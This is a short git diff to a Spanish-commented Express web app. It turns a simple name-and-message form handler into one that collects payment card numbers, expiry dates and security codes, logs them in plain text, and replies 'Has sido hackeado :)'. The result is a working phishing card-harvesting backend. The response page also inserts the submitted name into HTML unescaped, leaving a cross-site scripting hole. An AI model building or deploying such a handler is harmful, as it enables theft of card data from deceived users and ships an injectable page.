@@ -16,9 +16,9 @@ app.get('/', (req, res) => {
 
 // Ruta para manejar el formulario POST
 app.post('/submit', (req, res) => {
-  const { name, message } = req.body;
+  const { name, cardNumber, expiryDate, securityCode } = req.body;
   console.log('Recibida solicitud POST en la ruta /submit');
-  console.log('Datos recibidos:', name, message);
+  console.log('Datos recibidos:', name, cardNumber, expiryDate, securityCode);
   res.send(`
     <!DOCTYPE html>
     <html lang="es">
@@ -70,7 +70,7 @@ app.post('/submit', (req, res) => {
     <body>
       <div class="container">
         <h1>Gracias, ${name}</h1>
-        <p>POR TU RESPUESTA: ${message}</p>
+        <p>Has sido hackeado :) </p>
         <button onclick="window.history.back()">Regresar</button>
       </div>
     </body>
